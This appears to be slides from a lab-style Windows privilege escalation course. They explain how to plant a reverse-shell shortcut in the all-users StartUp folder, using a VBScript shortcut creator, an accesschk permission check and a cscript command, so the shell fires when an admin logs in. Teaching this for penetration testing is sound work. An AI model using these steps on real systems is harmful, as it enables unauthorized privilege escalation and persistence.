# Start Up Apps



Startup Apps Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory. Windows also has a startup directory for apps that should start for all users: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in. 107 Startup Apps Note that shortcut files (.lnk) must be used. The following VBScript can be used to create a shortcut file: Set oWS = WScript.CreateObject("WScript.Shell") sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk" Set oLink = oWS.CreateShortcut(sLinkFile) oLink.TargetPath = "C:\PrivEsc\reverse.exe" oLink.Save 108 Privilege Escalation

1. Use accesschk.exe to check permissions on the StartUp directory:

> .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Star t Menu\Programs\StartUp"

1. Note that the BUILTIN\Users group has write access to this directory. 109 Privilege Escalation
2. Create a file CreateShortcut.vbs with the VBScript provided in a previous slide. Change file paths if necessary.
3. Run the script using cscript:

> cscript CreateShortcut.vbs

1. Start a listener on Kali, then log in as the admin user to trigger the exploit.
